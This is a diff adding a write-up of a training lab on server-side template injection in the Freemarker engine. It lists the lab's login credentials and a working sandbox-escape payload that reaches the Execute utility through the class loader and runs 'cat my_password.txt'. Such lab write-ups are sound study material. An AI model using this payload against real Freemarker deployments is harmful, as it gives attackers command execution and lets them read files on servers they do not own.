@@ -1,0 +1,44 @@
+Description:
+This lab uses the Freemarker template engine and is vulnerable to Server-Side Template Injection (SSTI) due to a poorly implemented sandbox.
+The goal is to escape the sandbox and read the contents of a sensitive file.
+
+Steps to Solve:
+1️-Identify Available Objects
+-Log in using:
+content-manager:C0nt3ntM4n4g3r
+-Edit a product description template.
+-Notice that you have access to objects such as:
+article / product
+
+2️-Confirm SSTI & Method Access
+-Test basic method access:
+${article.class}
+-Confirms that reflection is possible.
+
+3️-Bypass the Sandbox
+Use a known exploit from PayloadsAllTheThings to:
+-Access the class loader
+-Load dangerous classes
+-Instantiate Execute utility
+
+4️-Exploit Payload:
+<#assign classloader=article.class.protectionDomain.classLoader>
+<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
+<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
+${dwf.newInstance(ec,null)("cat my_password.txt")}
+
+5️-Execute the Payload
+-Insert the payload into the template.
+-Save and reload the product page.
+
+6️-Retrieve the Result
+-The output will display the contents of:
+my_password.txt
+-Copy the result and submit it.
+
+Result:
+-Successfully bypassed the Freemarker sandbox
+-Achieved command execution
+-Retrieved sensitive file content:
+my_password.txt
